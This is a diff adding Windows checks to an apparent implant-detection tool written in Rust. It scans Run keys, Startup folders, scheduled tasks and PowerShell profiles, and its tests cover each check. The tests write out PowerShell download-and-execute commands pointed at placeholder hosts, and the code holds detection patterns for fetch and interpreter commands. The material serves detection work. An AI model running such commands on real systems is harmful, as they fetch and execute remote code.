@@ -16,7 +16,7 @@
 //! difference is deliberate and a conformance case argues for it.
 
 use crate::checks::Sink;
-use crate::host::{system_path, Host, Platform, Probe, Process};
+use crate::host::{system_path, Autostart, Host, Platform, Probe, Process};
 use crate::indicators::Indicators;
 use crate::verdict::{Finding, Kind, Verdict};
 use std::fs;
@@ -59,10 +59,17 @@ pub fn implant_processes(host: &dyn Host, ind: &Indicators, v: &mut Verdict) -> 
         }
     };
 
-    let truncates = host.platform() == Platform::Linux;
+    let platform = host.platform();
+    let truncates = platform == Platform::Linux;
     let running: Vec<&Process> = processes
         .iter()
-        .filter(|p| ind.is_implant_process(&p.name, truncates))
+        .filter(|p| {
+            if platform == Platform::Windows {
+                ind.is_implant_image(&p.name)
+            } else {
+                ind.is_implant_process(&p.name, truncates)
+            }
+        })
         .take(MAX_IMPLANT_PROCESSES)
         .collect();
     if running.is_empty() {
@@ -78,7 +85,11 @@ pub fn implant_processes(host: &dyn Host, ind: &Indicators, v: &mut Verdict) -> 
     );
     if host.is_live() {
         for p in &running {
-            finding = finding.with_remedy(format!("kill -9 {}", p.pid));
+            finding = finding.with_remedy(if platform == Platform::Windows {
+                format!("Stop-Process -Id {} -Force", p.pid)
+            } else {
+                format!("kill -9 {}", p.pid)
+            });
         }
     } else {
         // A pid from another machine is somebody else's process on this one.
@@ -105,6 +116,7 @@ pub fn persistence(
     v.section(match platform {
         Platform::Linux => "Persistence: systemd units, autostart, cron",
         Platform::MacOs => "Persistence: LaunchAgents, LaunchDaemons, cron",
+        Platform::Windows => "Persistence: Run keys, Startup folder, scheduled tasks",
     });
 
     let root = match host.system_root() {
@@ -143,7 +155,282 @@ pub fn persistence(
             }
             crontab(host, ind, v);
         }
+        Platform::Windows => {
+            run_keys(host, ind, v);
+            startup_folder(
+                &home
+                    .join("AppData")
+                    .join("Roaming")
+                    .join("Microsoft")
+                    .join("Windows")
+                    .join("Start Menu")
+                    .join("Programs")
+                    .join("Startup"),
+                ind,
+                v,
+                sink,
+            );
+            if let Some(dir) = system("ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp") {
+                startup_folder(&dir, ind, v, sink);
+            }
+            scheduled_tasks(host, ind, v);
+        }
     }
+}
+
+// --- Windows -----------------------------------------------------------------
+
+/// A value inside single quotes in PowerShell, where the only character that
+/// needs care is the quote itself. The name of a registry value or a task is
+/// chosen by whoever planted it.
+fn ps_quote(value: &str) -> String {
+    format!("'{}'", value.replace('\'', "''"))
+}
+
+/// `(curl|wget|powershell|node|mshta|certutil).*(http|-enc|iex)`, without
+/// regard to case: a fetch or an interpreter, then something that makes it
+/// one worth reading.
+fn windows_fetches_or_interprets(command: &str) -> bool {
+    let lower = command.to_ascii_lowercase();
+    let Some(end) = earliest_end(
+        &lower,
+        &["curl", "wget", "powershell", "node", "mshta", "certutil"],
+    ) else {
+        return false;
+    };
+    let rest = lower.get(end..).unwrap_or_default();
+    ["http", "-enc", "iex"].iter().any(|t| rest.contains(t))
+}
+
+/// What a confirmed entry runs, as evidence under the finding. A value can
+/// carry a token in an address, so it goes through the same redaction as
+/// everything else that is printed.
+fn evidence(v: &mut Verdict, command: &str) {
+    if !command.is_empty() {
+        v.detail(redact_userinfo(command));
+    }
+}
+
+fn run_keys(host: &dyn Host, ind: &Indicators, v: &mut Verdict) {
+    let entries = match host.run_keys() {
+        Probe::Read(entries) => entries,
+        Probe::NoTool(why) | Probe::Failed(why) => {
+            v.push(Finding::review(format!(
+                "could not read the registry Run keys, so they were not checked: {why}"
+            )));
+            return;
+        }
+    };
+    let mut flagged = 0usize;
+    for entry in &entries {
+        let what = format!("{}\\{}", entry.place, entry.name);
+        let remove = format!(
+            "remove it: Remove-ItemProperty -Path {} -Name {}",
+            ps_quote(&entry.place),
+            ps_quote(&entry.name)
+        );
+        if ind.has_strong(&entry.command) {
+            flagged += 1;
+            evidence(v, &entry.command);
+            v.push(
+                Finding::hit(
+                    Kind::Autostart,
+                    format!("run key entry contains an indicator: {what}"),
+                )
+                .with_remedy(remove),
+            );
+        } else if ind.names_implant(&entry.command) || ind.is_implant_image(&entry.name) {
+            flagged += 1;
+            evidence(v, &entry.command);
+            v.push(
+                Finding::hit(Kind::Autostart, format!("implant run key entry: {what}"))
+                    .with_remedy(remove),
+            );
+        } else if windows_fetches_or_interprets(&entry.command) {
+            flagged += 1;
+            evidence(v, &entry.command);
+            v.push(Finding::review(format!(
+                "run key entry runs a network or interpreter command: {what}"
+            )));
+        }
+    }
+    if flagged == 0 {
+        v.push(Finding::ok(format!(
+            "{} Run key {}, none containing an indicator",
+            entries.len(),
+            if entries.len() == 1 {
+                "entry"
+            } else {
+                "entries"
+            }
+        )));
+    }
+    for entry in &entries {
+        v.note(format!("{}\\{}", entry.place, entry.name));
+    }
+}
+
+fn startup_folder(dir: &Path, ind: &Indicators, v: &mut Verdict, sink: &mut Sink) {
+    // desktop.ini is Windows' own, in every Startup folder, and starts nothing.
+    let Some(items) = listing(dir, v, |n| !n.eq_ignore_ascii_case("desktop.ini")) else {
+        return;
+    };
+    let items: Vec<PathBuf> = items.into_iter().filter(|p| p.is_file()).collect();
+    if items.is_empty() {
+        v.push(Finding::ok(format!("nothing in {}", dir.display())));
+    }
+    for item in &items {
+        let Some(text) = read_entry(item, v) else {
+            continue;
+        };
+        if ind.has_strong(&text) {
+            let quarantined = sink.take(item, "startup-item");
+            v.push(
+                Finding::hit(
+                    Kind::LoginItem,
+                    format!("startup item contains an indicator: {}", item.display()),
+                )
+                .at(item)
+                .with_remedy(quarantined),
+            );
+        } else {
+            v.push(Finding::review(format!(
+                "startup item present, verify by hand: {}",
+                item.display()
+            )));
+        }
+    }
+}
+
+fn scheduled_tasks(host: &dyn Host, ind: &Indicators, v: &mut Verdict) {
+    let tasks = match host.scheduled_tasks() {
+        Probe::Read(tasks) => tasks,
+        Probe::NoTool(why) | Probe::Failed(why) => {
+            v.push(Finding::review(format!(
+                "could not list the scheduled tasks, so they were not checked: {why}"
+            )));
+            return;
+        }
+    };
+    let mut flagged = 0usize;
+    let mut own = 0usize;
+    for task in &tasks {
+        let what = format!("{}{}", task.place, task.name);
+        let remove = format!(
+            "remove it: Unregister-ScheduledTask -TaskName {} -TaskPath {} -Confirm:$false",
+            ps_quote(&task.name),
+            ps_quote(&task.place)
+        );
+        // The implant's own task is looked for everywhere, by name. Hiding
+        // under \Microsoft\ would otherwise be all it had to do.
+        if ind.is_implant_image(&task.name) || ind.names_implant(&task.command) {
+            flagged += 1;
+            evidence(v, &task.command);
+            v.push(
+                Finding::hit(
+                    Kind::Autostart,
+                    format!("implant scheduled task registered: {what}"),
+                )
+                .with_remedy(remove),
+            );
+        } else if ind.has_strong(&task.command) {
+            flagged += 1;
+            evidence(v, &task.command);
+            v.push(
+                Finding::hit(
+                    Kind::Autostart,
+                    format!("scheduled task contains an indicator: {what}"),
+                )
+                .with_remedy(remove),
+            );
+        } else if is_windows_own_task(task) {
+            own += 1;
+        } else if windows_fetches_or_interprets(&task.command) {
+            flagged += 1;
+            evidence(v, &task.command);
+            v.push(Finding::review(format!(
+                "scheduled task runs a network or interpreter command: {what}"
+            )));
+        }
+    }
+    if flagged == 0 {
+        v.push(Finding::ok(format!(
+            "{} scheduled tasks outside Windows' own, none containing an indicator",
+            tasks.len() - own
+        )));
+    }
+}
+
+/// Windows ships hundreds of tasks under `\Microsoft\`, many of which run
+/// PowerShell. They are checked for indicators and for the implant, and are
+/// not listed for review: nobody reads four hundred lines.
+fn is_windows_own_task(task: &Autostart) -> bool {
+    task.place.to_ascii_lowercase().starts_with("\\microsoft\\")
+}
+
+/// The PowerShell profiles of the account: what a new PowerShell window runs
+/// before the prompt appears.
+fn powershell_profiles(home: &Path, ind: &Indicators, v: &mut Verdict) {
+    v.section("PowerShell profiles");
+    let mut seen = 0usize;
+    for folder in ["PowerShell", "WindowsPowerShell"] {
+        for name in ["Microsoft.PowerShell_profile.ps1", "profile.ps1"] {
+            let file = home.join("Documents").join(folder).join(name);
+            if !file.is_file() {
+                continue;
+            }
+            seen += 1;
+            let Some(text) = read_entry(&file, v) else {
+                continue;
+            };
+            if ind.has_strong(&text) {
+                v.push(
+                    Finding::hit(
+                        Kind::StartupFile,
+                        format!(
+                            "PowerShell profile contains an indicator: {}",
+                            file.display()
+                        ),
+                    )
+                    .at(&file)
+                    .with_remedy(
+                        "edit it by hand and remove the line. Profiles are never quarantined.",
+                    ),
+                );
+            } else if text.lines().any(downloads_and_executes) {
+                v.push(
+                    Finding::hit(
+                        Kind::StartupFile,
+                        format!(
+                            "PowerShell profile downloads and executes code: {}",
+                            file.display()
+                        ),
+                    )
+                    .at(&file)
+                    .with_remedy("edit it by hand and remove the line."),
+                );
+            } else {
+                v.push(Finding::ok(format!("clean: {}", file.display())));
+            }
+        }
+    }
+    if seen == 0 {
+        v.push(Finding::ok("no PowerShell profile in the home directory"));
+    }
+}
+
+/// `(iex|Invoke-Expression).*(http|DownloadString)`, on a line that is not a
+/// comment, without regard to case.
+fn downloads_and_executes(line: &str) -> bool {
+    if line.trim_start().starts_with('#') {
+        return false;
+    }
+    let lower = line.to_ascii_lowercase();
+    let Some(end) = earliest_end(&lower, &["iex", "invoke-expression"]) else {
+        return false;
+    };
+    let rest = lower.get(end..).unwrap_or_default();
+    rest.contains("http") || rest.contains("downloadstring")
 }
 
 /// Direct children of `dir` whose name passes `keep`, sorted. `None` when the
@@ -402,6 +689,10 @@ fn crontab(host: &dyn Host, ind: &Indicators, v: &mut Verdict) {
 // ---------------------------------------------------------------------------
 
 pub fn shell_startup(home: &Path, platform: Platform, ind: &Indicators, v: &mut Verdict) {
+    if platform == Platform::Windows {
+        powershell_profiles(home, ind, v);
+        return;
+    }
     v.section("Shell startup files");
     let names: &[&str] = match platform {
         Platform::Linux => &[
@@ -420,6 +711,8 @@ pub fn shell_startup(home: &Path, platform: Platform, ind: &Indicators, v: &mut 
             ".bash_profile",
             ".profile",
         ],
+        // Handled above: Windows has profiles, not dot files.
+        Platform::Windows => &[],
     };
 
     let mut seen = 0usize;
@@ -728,7 +1021,7 @@ pub fn connections(host: &dyn Host, ind: &Indicators, v: &mut Verdict) {
 
 fn from_node_or_editor(line: &str, platform: Platform) -> bool {
     let names: &[&str] = match platform {
-        Platform::Linux => &["node", "code", "cursor", "electron"],
+        Platform::Linux | Platform::Windows => &["node", "code", "cursor", "electron"],
         Platform::MacOs => &["node", "code helper", "cursor", "electron"],
     };
     let line = line.to_ascii_lowercase();
@@ -802,7 +1095,22 @@ fn runs_inline_code(command: &str) -> bool {
         command.match_indices(interpreter).any(|(at, found)| {
             let mut rest = command.get(at + found.len()..).unwrap_or_default();
             if *interpreter == "python" {
-                rest = rest.trim_start_matches(|c: char| c.is_ascii_digit() || c == '.');
+                let versioned = rest.trim_start_matches(|c: char| c.is_ascii_digit() || c == '.');
+                // python3.12.exe: the last dot belongs to the extension.
+                let ate_a_dot = rest.len() > versioned.len()
+                    && rest
+                        .get(..rest.len() - versioned.len())
+                        .is_some_and(|eaten| eaten.ends_with('.'));
+                rest = match versioned.get(..3) {
+                    Some(ext) if ate_a_dot && ext.eq_ignore_ascii_case("exe") => {
+                        versioned.get(3..).unwrap_or_default()
+                    }
+                    _ => versioned,
+                };
+            }
+            // Windows: node.exe, and a quoted path ends with a quote.
+            for suffix in [".exe", ".EXE", "\""] {
+                rest = rest.strip_prefix(suffix).unwrap_or(rest);
             }
             let flag = rest.trim_start_matches(|c: char| c.is_ascii_whitespace());
             if flag.len() == rest.len() {
@@ -936,6 +1244,236 @@ mod tests {
             })
             .collect::<Vec<_>>()
             .join("\n")
+    }
+
+    // --- Windows --------------------------------------------------------------
+
+    fn entry(place: &str, name: &str, command: &str) -> Autostart {
+        Autostart {
+            place: place.into(),
+            name: name.into(),
+            command: command.into(),
+        }
+    }
+
+    const RUN: &str = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+
+    fn windows_persistence(host: &Snapshot, dir: &Path) -> Verdict {
+        let q = Quarantine::<DryRun>::new(dir.join("q"));
+        let mut v = Verdict::new();
+        persistence(host, &dir.join("home"), &ind(), &mut v, &mut Sink::Dry(&q));
+        v
+    }
+
+    #[test]
+    fn on_windows_the_implant_is_matched_by_image_name_whatever_its_case() {
+        let dir = machine("win-implant", &[]);
+        let mut host = quiet(&dir, Platform::Windows);
+        host.processes = Probe::Read(vec![
+            process(4, "System", ""),
+            process(900, &format!("{}.EXE", IMPLANT.to_uppercase()), "C:\\x"),
+            // Mentions it and is not it.
+            process(901, "powershell.exe", &format!("findstr {IMPLANT} log.txt")),
+            // A longer name that only begins with the implant's.
+            process(902, &format!("{IMPLANT}Helper.exe"), ""),
+        ]);
+        let mut v = Verdict::new();
+        assert_eq!(
+            implant_processes(&host, &ind(), &mut v),
+            ProcessCheck::Running
+        );
+        assert_eq!(details(&v).len(), 1);
+        assert!(details(&v)[0].starts_with("900 "));
+        // Supplied state: no command with a pid from another machine.
+        assert!(!everything(&v).contains("Stop-Process"));
+    }
+
+    #[test]
+    fn a_run_key_is_confirmed_by_an_indicator_or_the_implant_and_says_how_to_remove_it() {
+        let dir = machine("win-runkeys", &[]);
+        let mut host = quiet(&dir, Platform::Windows);
+        host.run_keys = Probe::Read(vec![
+            entry(
+                RUN,
+                "OneDrive",
+                "\"C:\\Program Files\\OneDrive\\OneDrive.exe\" /background",
+            ),
+            entry(RUN, "It's Updater", &format!("node C:\\x.js {STRONG}")),
+            entry(
+                RUN,
+                "Helper",
+                &format!("C:\\Users\\x\\AppData\\Local\\{IMPLANT}.exe --quiet"),
+            ),
+            entry(RUN, "Fetcher", "PowerShell -Enc SQBFAFgA"),
+            // Somebody else's program whose name begins with the implant's.
+            entry(RUN, "Other", &format!("C:\\tools\\{IMPLANT}Viewer.exe")),
+        ]);
+        let v = windows_persistence(&host, &dir);
+        let all = everything(&v);
+        assert!(has(
+            &v,
+            Level::Hit,
+            &format!("run key entry contains an indicator: {RUN}\\It's Updater")
+        ));
+        // The quote in the name cannot close the quote in the command.
+        assert!(all.contains(&format!(
+            "remove it: Remove-ItemProperty -Path '{RUN}' -Name 'It''s Updater'"
+        )));
+        assert!(has(
+            &v,
+            Level::Hit,
+            &format!("implant run key entry: {RUN}\\Helper")
+        ));
+        assert!(has(
+            &v,
+            Level::Review,
+            "run key entry runs a network or interpreter command"
+        ));
+        assert_eq!(v.hits(), 2);
+        assert_eq!(v.reviews(), 1);
+        assert!(!has(&v, Level::Hit, "Other") && !has(&v, Level::Review, "Other"));
+        assert!(v
+            .findings()
+            .filter(|f| f.level == Level::Hit)
+            .all(|f| f.kind == Some(Kind::Autostart)));
+    }
+
+    #[test]
+    fn windows_own_tasks_are_checked_and_not_listed_and_the_implant_cannot_hide_among_them() {
+        let dir = machine("win-tasks", &[]);
+        let mut host = quiet(&dir, Platform::Windows);
+        host.scheduled_tasks = Probe::Read(vec![
+            // Windows' own, running PowerShell over http: checked, not listed.
+            entry(
+                "\\Microsoft\\Windows\\Update\\",
+                "Scan",
+                "powershell.exe -File http-check.ps1",
+            ),
+            entry("\\", "Backup", "C:\\tools\\backup.exe --all"),
+            entry(
+                "\\",
+                "Nightly",
+                "powershell -c iex (irm http://example.test/a)",
+            ),
+            entry(
+                "\\Microsoft\\Windows\\",
+                IMPLANT,
+                "C:\\ProgramData\\svc.exe",
+            ),
+        ]);
+        let v = windows_persistence(&host, &dir);
+        assert!(has(
+            &v,
+            Level::Hit,
+            &format!("implant scheduled task registered: \\Microsoft\\Windows\\{IMPLANT}")
+        ));
+        assert!(everything(&v).contains(&format!(
+            "remove it: Unregister-ScheduledTask -TaskName '{IMPLANT}' -TaskPath '\\Microsoft\\Windows\\' -Confirm:$false"
+        )));
+        assert!(has(
+            &v,
+            Level::Review,
+            "scheduled task runs a network or interpreter command: \\Nightly"
+        ));
+        assert_eq!((v.hits(), v.reviews()), (1, 1));
+        assert!(!everything(&v).contains("Scan"));
+    }
+
+    #[test]
+    fn the_startup_folder_is_read_and_desktop_ini_is_not_an_item() {
+        let startup = "home/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
+        let dir = machine(
+            "win-startup",
+            &[
+                (&format!("{startup}/desktop.ini"), "[.ShellClassInfo]\n"),
+                (
+                    &format!("{startup}/updater.bat"),
+                    &format!("node x.js {STRONG}\n"),
+                ),
+                (&format!("{startup}/notes.lnk"), "shortcut\n"),
+                (
+                    "root/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/all.cmd",
+                    &format!("echo {STRONG}\n"),
+                ),
+            ],
+        );
+        let v = windows_persistence(&quiet(&dir, Platform::Windows), &dir);
+        assert!(has(&v, Level::Hit, "updater.bat"));
+        assert!(has(&v, Level::Hit, "all.cmd"));
+        assert!(has(
+            &v,
+            Level::Review,
+            "startup item present, verify by hand"
+        ));
+        assert_eq!((v.hits(), v.reviews()), (2, 1));
+        assert!(!everything(&v).contains("desktop.ini"));
+    }
+
+    #[test]
+    fn a_quiet_windows_machine_is_clean_and_an_unread_registry_is_not() {
+        let dir = machine("win-quiet", &[]);
+        let mut host = quiet(&dir, Platform::Windows);
+        let v = windows_persistence(&host, &dir);
+        assert_eq!((v.hits(), v.reviews()), (0, 0), "{}", everything(&v));
+        assert!(has(
+            &v,
+            Level::Ok,
+            "0 Run key entries, none containing an indicator"
+        ));
+
+        host.run_keys = Probe::Failed("powershell: access denied".into());
+        host.scheduled_tasks = Probe::NoTool("powershell is not available".into());
+        let v = windows_persistence(&host, &dir);
+        assert!(has(
+            &v,
+            Level::Review,
+            "could not read the registry Run keys"
+        ));
+        assert!(has(&v, Level::Review, "could not list the scheduled tasks"));
+    }
+
+    #[test]
+    fn a_powershell_profile_that_downloads_and_runs_code_is_a_hit_and_a_comment_is_not() {
+        let profile = "home/Documents/PowerShell/Microsoft.PowerShell_profile.ps1";
+        let dir = machine(
+            "win-profile",
+            &[
+                (profile, "Set-Alias ll ls\nIEX (New-Object Net.WebClient).DownloadString('http://x.test/a')\n"),
+                (
+                    "home/Documents/WindowsPowerShell/profile.ps1",
+                    "# iex (irm http://example.test/install.ps1)\nSet-Alias g git\n",
+                ),
+            ],
+        );
+        let mut v = Verdict::new();
+        shell_startup(&dir.join("home"), Platform::Windows, &ind(), &mut v);
+        assert!(has(
+            &v,
+            Level::Hit,
+            "PowerShell profile downloads and executes code"
+        ));
+        assert!(has(&v, Level::Ok, "clean: "));
+        assert_eq!(v.hits(), 1);
+
+        let empty = machine("win-noprofile", &[]);
+        let mut v = Verdict::new();
+        shell_startup(&empty.join("home"), Platform::Windows, &ind(), &mut v);
+        assert!(has(
+            &v,
+            Level::Ok,
+            "no PowerShell profile in the home directory"
+        ));
+    }
+
+    #[test]
+    fn inline_code_is_seen_through_a_quoted_windows_path() {
+        assert!(runs_inline_code(
+            "\"C:\\Program Files\\nodejs\\node.exe\" -e \"require('x')\""
+        ));
+        assert!(runs_inline_code("python3.12.exe -c pass"));
+        assert!(!runs_inline_code(
+            "\"C:\\Program Files\\nodejs\\node.exe\" server.js"
+        ));
     }
 
     // --- implant processes --------------------------------------------------
